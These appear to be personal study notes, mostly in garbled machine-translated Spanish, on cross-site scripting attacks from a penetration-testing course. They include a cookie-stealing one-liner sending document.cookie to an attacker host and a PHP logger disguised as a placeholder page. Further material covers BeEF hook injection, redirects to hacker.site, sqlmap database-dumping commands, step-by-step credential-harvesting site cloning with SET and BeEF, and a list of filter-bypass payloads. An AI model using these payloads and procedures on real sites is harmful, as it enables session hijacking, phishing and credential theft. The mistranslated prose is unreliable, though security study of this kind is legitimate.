# XSS

## Definition

* XSS ocurre cuando un navegador hace contenido no defisciable en un entorno de confianza.
* Si el contenido contiene lenguajes dinámicos como HTML, JavaScript y otros, el navegador puede ejecutar el código no confiable.

Los 4 tipos:

### Reflected XSS

Ocurre cuando los datos de los usuarios no confiables se envían a una aplicación web y su resonado inmediatamente de nuevo en el contenido no confiable. Luego, como de costumbre, el navegador recibe el código de la respuesta del servidor web y lo hace.

```php
<?php $name = @$_GET['name'];?>
Welcome <?=$name?>
```

### Persistent XSS

* En lugar de que la entrada maliciosa se refleje directamente en la respuesta, la almacenada dentro de la aplicación web
* Una vez que esto ocurre, su entonces se hizo eco en otro lugar dentro de la aplicación web y podría estar disponible para todos los visitantes.
* En este escenario, tanto las bases de datos como el sistema de archivos son los mecanismos de almacenamiento de datos objetivo.

### DOM XSS

Es una forma de XSS que existe sólo dentro del código del cliente (normalmente JavaScript)

No llega al código del lado del servidor. Esta es la razón por la que este defecto también se conoce como **Type-0** o **Local XSS**.

La información que podemos obtener son la URL, historia, cookies, almacenamiento local, etc.

Hay dos palabras clave: _fufuerciones_ y \*\* sable\*\*.

> En el software, el flujo de datos puede ser considerado como en el flujo de agua en los sistemas de acueducación que parte de fuentes naturales y termina a los sumideros. En la seguridad de los programas informáticos, las fuentes deben considerarse puntos de partida en los que la aplicación toma datos de entrada no confiables.

Los hundimientos están destinados a ser los puntos en el flujo donde los datos dependiendo de las fuentes se utilizan de una manera potencialmente peligrosa que resulta en la pérdida de confidencialidad, integridad o disponibilidad.

→ Moreover DOM XSS: https://code.google.com/p/domxsswiki/

### Universal XSS

* Aka UXSS
* no aprovecha las fallas contra las aplicaciones web, sino el navegador, sus extensiones o sus plugins.

## XSS Attacks

### Cookie Gathering

* Las principales técnicas para realizar un seguimiento de la sesión de usuario se utilizan cookies HTTP.
* A veces estas cookies contienen información como nombre de usuario, contraseña y otra información relacionada con la aplicación.

3 steps:

```php
- Script Injection
- Cookie Recording
- Logging
```

### Script Injection

Inyectar la carga útil maliciosa que enviará las galletas robadas a nuestro CGI controlado Acceso a las Cookies:

```php
var accessibleCookies = document.cookie;
```

AccesibleCookies es una cadena que contiene una lista de galletas separadas por pares de punto y coma en pares de key=value. El resultado contiene cookies sin el atributo HTTPOnly. En las conexiones HTTP, solo las cookies sin el conjunto de atributos SECURE están contenidas en el resultado.

Robar galletas Para robar cookies, tenemos que enviar el contenido de document.cookie a algo que podamos controlar, utilizando un sencillo script como:

```php
new Image().src="http://kali.site/C.php?cc="+escape(document.cookie);
```

![[Pasted image 20240311152649.png]]

![[Pasted image 20240311152658.png]]

Cookie Recording & Logging:

Una vez que el lado del cliente ha realizado la solicitud a nuestro CGI controlado, es hora de manejar la solicitud y administrar el parámetro enviado.

Aquí, definimos qué información recopilar, cómo almacenarla y la acción a realizar una vez que se obtenga esta valiosa información.

Supongamos que tenemos nuestro script PHP C.php escuchando en nuestra máquina kali

Un ejemplo básico es almacenar el contenido de GET\['cc'] en un archivo.

```php
<?php
error_reporting(0); #turn off all error reporting
$cookie = $_GET['cc']; #request to log
$file = '_cc_.txt'; #the log file
$handle = fopen($file,"a"); # open log file in append mode
fwrite($handle,$cookie."\n"); # append the cookie
fclose($handle); #append the cookie
echo '<h1>Page Under Construction</h1>'; #trying to hide suspects
>
```

![[Pasted image 20240311152720.png]]

Una vez que obtengamos la cookie deseada, podemos hacer varias operaciones además de la tala. Algunos ejemplos son los siguientes:

* una solicitud a una API que requiere las cookies robadas (implantación)
* notificar al atacante por correo electrónico

La solución simple es utilizar netcat

```bash
netcat -lvvp 80
<script> new Image().src="kali ip"+escape(document.cookie); </script>
```

### Bypassing HTTPOnly Flag

Esta bandera obliga al navegador a manejar la cookie sólo cuando se descarte la solicitud HTTP; por lo tanto; Para los lenguajes de scripting del lado del cliente (IE: JavaSCript), estas cookies son prácticamente invisibles.

### Cross-Site Tracking (XST)

TRACE connection:

```bash
curl <victim.site> -X TRACE -H "Test: test-header"
```

En JavaScript, existe el objeto **XMLHttpRequest** que proporciona una manera fácil de recuperar datos de una URL.

> Esta técnica es muy antigua y consecuentemente navegadores modernos BLOCK el método HTTP TRACE en XMLHttpRequest y en otros lenguajes y bibliotecas de scripting como _JQuery_, _Silverlight_, _Flag/ACtionScript_, etc.

![[Pasted image 20240311152737.png]]

### CVE:2012-0053 aka Apache HTTPOnly Cookie Disclosure

* Otra forma de acceder a las cookies HTTPOnly es explotar los errores del servidor web
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0053
* Este ejemplo está relacionado con el infames Apace HTTP Server 2.2.x through 2.2.21 Es posible crear y luego se esfuerza una ráfaza de galletas grandes que luego genera la página de error de 400. Podemos entonces leer la respuesta que definitivamente contendrá las cookies HTTPOnly.

PoC = https://gist.github.com/pilate/1955a1c28324d4724b7b

* En BeEF hay un módulo llamado **Apache Cookie Disclosure**, que está disponible en la sección **Exploits**.

### BeEF Tunneling Proxy

Una alternativa para robar cookies protegidas es utilizar el navegador víctima como proxy.

* Podemos hacer esto usando **Tunneling Proxy** en BeEF. Esta característica le permite solicitar el túnel a través del navegador enganchado.
* También es eficaz contra técnicas de protección de desarrolladores web, como el uso de múltiples validaciones como \*\* Usuario-Agent\*\*, **IP**, encabezados personalizados, etc.

## Defacements

* En lugar de inyectar código malicioso que funciona entre bastidores y realiza operaciones malignas (que roban en gallarias) con este método de ataque la intención maliciosa es dar un mensaje preciso o información engañosa a los usuarios de las aplicaciones atacadas. Examples:

```bash
http://www.xssed.com/news/110/Norton_Update_Center_critical_XSS_vulnerability/
http://news.netcraft.com/archives/2008/04/24/clinton_and_obama_xss_battle_develops.html
http://zerosecurity.org/2013/01/mit-hacked-defaced-by-anonymous
```

### Virtual Defacement

* Explotar un fallo XSS que no modifique el contenido alojado en la aplicación web de destino.
* Típicamente, esto es lo que sucede cuando abusa de defectos XSS reflectados.

### Persistent Defacement

* En el caso, un desfiguramiento se vuelve persistente. En este caso la página de ataque está modigida permanentemente y, a pesar del tipo de Desfiguración Virtual aquí, el atacante no necesita engañar a los usuarios para que visiten una URL elaborada.

## Phising

* El acto de intentar adquirir información sensible, como nombres de usuario, contraseñas y datos de tarjetas de crédito (y a veces, indirectamente, dinero) al disfracarse de entidad de confianza en una comunicación electrónica.

Escaletas fundamentales:

* Crear un sitio web falso que contenga el código malicioso que el atacante quiere ejecutar.

Ejemplo básico:

* Realizar un phishing XSS, alterar el atributo **action** de la etiqueta "FORM". con el fin de secuestrar la entrada del formulario enviado.

> Estamos asumiendo que la página de fallas XSS está en la misma página del formulario robado; si no es, necesitamos aprovechar el fallo XSS para acceder al formulario que hemos apuntado (ejemplo: abrir la página)

EN este caso las defensas fallan porque el sitio web de phishing es el sitio web real.

### Cloning a Website

Si queremos clonar un sitio web existente o clonar e inyectar una carga útil, entonces podemos utilizar una de las siguientes herramientas:

```bash
GNU Wget
BeEF
SET site cloner
```

### Choosing a Domain Name

* Una vez que el sitio web ha sido clonado, usted debe considerar dónde albergará el sitio de phishing.
* Cuanto más el nombre de dominio sea similar al nombre de dominio de las víctimas, mejor.
* Añadir tipitopos y jugar con los personajes variaciones es la mejor llamada.

Tool:

```bash
URLCrazy
usage: urlcrazy <www.google.com>
```

## Keylogging

* A veces es útil saber lo que nuestra víctima está escribiendo durante su actividad en un sitio web dirigido.
* Necesitamos código del lado del cliente que capture las pulsaciones de teclas y el código del lado del servidor que almacena las claves enviadas.

### JavaScript Example

![[Pasted image 20240311152800.png]]

Los marcos más conocidos también incluyen una característica de keylogging:

```bash
Metaslpoit - http_javascript_keylogger
BeEF - event logger
```

### Keylogging with Metasploit

auxiliary/server/capture/http\_javascript\_keylogger

* crea la carga útil JS y inicia el servidor de escuchas
* este módulo crea una DEMO PAGE para nosotros. Sólo habilite la opción DEMO con el conjunto DEMO true.

### Keylogging with BeEF

* la versión actualizada de los ejemplos anteriores.
* Estos registros están disponibles Para la interfaz de usuario de la administración en la pestaña Registros, mientras que con la consola se imprimen a medida que ocurren.

## Network Attacks

* En una capa de red podemos obtener acceso a variedades de servicios que de otro modo no estarían disponibles a través de HTTP.
* Como servicios de correo electrónico, servicios de fax e impresión, servidores web internos y más

### IP Detection

* Recuerca la mayor cantidad de información posible

My Address Java Applet - http://reglos.de/myaddress/MyAddress.html //Se necesita interacción de los usuarios

* su usualmente bloqueado, u necesita bajar la seguridad de la java y permitir que la página ejecute la aplicación

HTML5 WebRTC feature:

```bash
ipcalf - http://net.ipcalf.com/
improved version -  https://hacking.ventures/local-ip-discovery-with-html5-webrtc-security-and-privacy-risk/ 
# this scan local ips and other alive hosts 
# its not supported by all browser, IE and safari do not support this.
```

### Subnet Detection

The browser Hackers handbook: http://browserhacker.com/code/Ch10/index.html

**Identifying Internal Network Subnets**

Pasos:

```bash
- Comience de un conjunto de rangos IP de entrada por defecto más comunes
- Pruebe un subconjunto de IPs probables en la subred
- Resultados... en rojo los huésmos descubiertos
```

### Ping Sweeping

Dos enfoques:

```bash
- Java Applets
- El mismo enfoque utilizado antes para detectar subredes
```

En lugar de probar sólo un par de IPs, comprobaremos toda la subred.

**XHR** technique:

* si una respuesta llega en poco tiempo, entonces el huésped está vivo; de lo contrario, después de un umbral definido, el huésped está abajo.
* Dado que este enfoque está basado en el tiempo, latencias de red de la red, características de red del navegador, etc. puede aumentar el número de falsos positivos.

### Port Scanning

PDP portscan in JS: http://web.archive.org/web/20100626084549/http:/www.gnucitizen.org/static/blog/2006/08/jsportscanner.js

```bash
- PDP uses <img> tag and DOM events to detect whether a port on a specific host is opened or closed.
- The idea is to set the image source on a specific port of the target host in order to let the browser know to perform a TCP connection to the defined port and then analyze the events.

- with Cross-Origin Resource Sharing (CORS) and WebSocket, both of which are new HTML5 features, its also possible to scan networks and ports.
- JS-Recon  = http://web.archive.org/web/20120308180633/http:/www.andlabs.org/tools/jsrecon/jsrecon.html
# a network reconnaissance tool writen in JavaScript
```

### Self-XSS

* En este ataque, el objetivo es engañar a las víctimas para que peguen código malicioso en una barra o consola de URL del navegador.

Example: http://www.zdnet.com/facebook-flooded-with-porn-spam-3040094432/

## Bypass

### browsers based on Chromium strip the javascript part.

```js
# So we can copy and paste <enter>
# Or we can drag and drop 
JavaScript:alert('Self-XSS')

# Using Data Scheme works with the same methods
data:text/html,<script>alert('Self-XSS')</script>

# We can encode the script with Base64. It works the same.
```

### Based on Firefox

* Mozilla Firefox desautora el acceso al contexto de seguridad de la página actualmente cargada si ese acceso es intentado por URI javascript o de cheque de datos introducido directamente en la barra de localización de los navegadores.
* De todos modos, es posible ejecutar redir direcciones u otras operaciones maliciosas con ambos esquemas.

Redirir en hacker.site con \*\* esquemajavascript\*\*:

```js
javascript:{this.window='<script>document.location="http://hacker.site"</script>'};
```

Redirdirecta a hacker.site con **data** esquema:

```js
data:text/html,<script>document.location="http://hacker.site"</script>
```

### Access objects in the DOM via bookmarks

in imágenes:

```bash
1. Create a bookmark: Alert cookies > javascript:alert(document.cookie)
2. Click
3. Browser execute JavaScript
# this bookmarks technique is also valid in browsers like Chromium, Internet Explorer and Safari
```

### Internet Explorer

* el esquema de datos es limitado, pero javascript está disponible

El único límite es similar a los navegadores Chormium, despojará a cualquier líder **javascript:** del texto pedeado antes de insertarse en la barra de búsqueda:

```js
javascript:document.location='http://hacker.site'
```

### Safari

* Denies javascript del campo de búsqueda inteligente, pero se permite dentro **bookmarks**
* The **data scheme** is allowed too

### NoScript Security Suite

* Su extensión de bombfox, añade una capa de seguridad adicional que bloquea todos los URI de javascript y datos
* En contraste, al igual que con otros navegadores, \*\* no bloquea\*\* esquemas de javascript y URI de datos dentro de **Bookmarks**.

## Exotic XSS Vectors

### mXSS - Mutation-Based

* Esta es una clase de vectores XSS, que pueden ocurrir en **inHTML** y propiedades FOM relacionadas.
* Con este tipo de mutaciones, cuerda inofenable que pasa claramente todos los filtros XSS se transforman en vectores de ataque XSS por el propio motor de diseño del navegador.

Es una técnica antigua, funciona en IE8 o más

To test: http://html5sec.org/innerhtml

moreover: http://www.businessinfo.co.uk/labs/mxss/

```js
<listing>&amp;lt;img src=1 onerror=alert(1)&gt;</listing>
```

## Create an external IP to get requests

Puede utilizar NGROK o localtunnel para abrir una IP externa para recibir cookies Por ejemplo.

```bash
https://github.com/inconshreveable/ngrok
https://github.com/localtunnel/localtunnel
```

Este script puede ayudar a robar cookies:

```bash
https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py
```

## Notes from Video

### 1 - Keylogging

Metasploit:

````bash
service postgresql start
service metasploit start
```bash

DOM XSS:
```js
<img/src=x style="display:none" onerror="s=document.createElement('script'); s.setAttribute('src','<beef hook>');document.head.appendChild(s)">
````

### 2 - From an XSS to a SQL Injection

```bash
BeEF > Rider > Forge Request
```

PoC XSS:

```js
<span onmouseover="console.info('sounds good')">Great site</span>
```

Inject the BeEF hook:

```js
random message<script src="beef hook"></script>
```

```js
in BeEF > click in the target IP > use as Proxy
- configure a browser proxy such as foxyproxy
- 127.0.0.1:8080
- ignore proxy For localhost, 127.0.0.1, <our ip>
```

in BURP:

```js
- Options > Connections > Upstream Proxy Server
- Destination Host:*
- Proxy Host: 127.0.0.1
- Proxy Port: 6789

- Target > Scope
- Host: <target domain or IP>
```

SQLMAP:

```bash
sqlmap -u "<target url/search?rnd=a1a1&name=a>" -p name --proxy="http://127.0.0.1:8080" --randomize rnd --dbms=mysql --technique=U --union-cols=7-10 --prefix "'" --sufix " # " --banner
sqlmap -u "<target url/search?rnd=a1a1&name=a>" -p name --proxy="http://127.0.0.1:8080" --current-db
sqlmap -u "<target url/search?rnd=a1a1&name=a>" -p name --proxy="http://127.0.0.1:8080" -D <name of the db> --tables
sqlmap -u "<target url/search?rnd=a1a1&name=a>" -p name --proxy="http://127.0.0.1:8080" -D <DBs name> -T <TABLEs name> --collums 
```

### 3 - Website Cloning

```bash
# edit /etc/hosts > add 127.0.0.1 cloned.test
cd /etc/apache2/sites-available > cp default cloned.test

# edit clonet.test > add ServerName cloned.test > edit DocumentRoot /var/www/cloned.test
a2ensite cloned.test
service apache2 reload

cd /var/www/cloned.test
echo 'Hello World' > index.html
test in browser
```

#### Clone with wget

```bash
cd /var/www/cloned.test/
wget -mK -nH <target site>
```

#### Clone with BeEF

```bash
beef -x
```

in shell:

```bash
curl -H "Content-Type: application/json; charset=UTF-8" \ -d '{"url":"<target URL>", "mount":"/amazon"}' \ -X POST http://127.0.0.1:3000/api/seng/clone_page?token=<API key from BeEF console> 

- Go to the browser and visit the address
- localhost:3000/amazon
# with beef its cloned + its automaticaly hooked 
# If the user type anything like user:password it will be redirect to the original site and BeEF will capture any info
```

in BeEF GUI:

```bash
Current Browser > Commands > Browser > Hooked Domain > Create Prompt Dialog
<write something> - Execute
```

#### Create a Similar Targets Domain with URLCRAZY

```bash
urlcrazy <target URL>
```

#### Cloning with The Social-Engineer Toolkit

```bash
setoolkit
```

in shell:

```bash
cd /usr/share/set/config; 
cp set_config set_config.bkp
edit set_config > APACHE_DIRECTORY=/var/www/cloned.test
edit HARVESTER_LOG=/var/www/cloned.test/
```

in SET:

```bash
1 - Social-Engineer Attacks
2 - Website Attack Vectors
3 - Credential Harvester Attack Method
2 - Site Cloner
# <in real scenarios we need to configure an external IP address, in this case well skip>
# <enter the URL to clone>
```

> test in browser the cloned site

```bash
cd /var/www/cloned.test/
edit index.html
add in responseBody > ("An error has occurred, Please Retry!");
add setTimeout(function(){document.location.href="<the original URL of the target>";},2000);
clean other lines that are not useful to the code
```

```bash
mv post.php login.php 
# because the javascript want a login.php page

insert login:password in the test cloned site, it should redirect to the original after the try

go to /var/www/cloned.test/
cat harvester file 

# it should show the login:password captured
```

## Lab - 11 Levels to Bypass XSS

### 1 - normal

```js
<script>alert("l33t")</script>
```

### 2 - bypass script

```js
<script<script>>alert("l33t")</script>
```

### 3 - no script allowed

```js
<img/src onerror=alert("l33t")>
```

### 4 - no script / no ON allowed

```js
<svg><script>alert('l33t')
```

### 5 - no ON, no functions

```js
<svg><script>alert&lpar;'l33t'&rpar;
```

### 6 - no alert

```js
<script>\u0061lert('l33t')</script>
```

### 7 - No Unicode escaping / no alert

```js
<script>eval('\x61lert(\'l33t\')')</script>
```

### 8 - No alert / no products

```js
[NL]eval('x61lert(\'l33t\')'
</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`l33t` //>#
</Title/</script/><img src=x onerror="\u0061lert('l33t')"/>#
</script><svg onload="eval(atob('YWxlcnQoJ2wzM3QnKQ=='))"> 
```

### 9 - stronger bypass - no alert / no products

```js
[\u2028]eval('x61lert(\'l33t\')'
</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`l33t` //>#
</Title/</script/><img src=x onerror="\u0061lert('l33t')"/>#
</script><svg onload="eval(atob('YWxlcnQoJ2wzM3QnKQ=='))"> 
```

### 10 - no string / no alert /

```js
<script>eval(8680439..toString(30))(983801..toString(36))</script>
```

### 11 - no scripts / dont break src tag

```js
http://11.xss.labs%2f@hacker.site/X.js
```
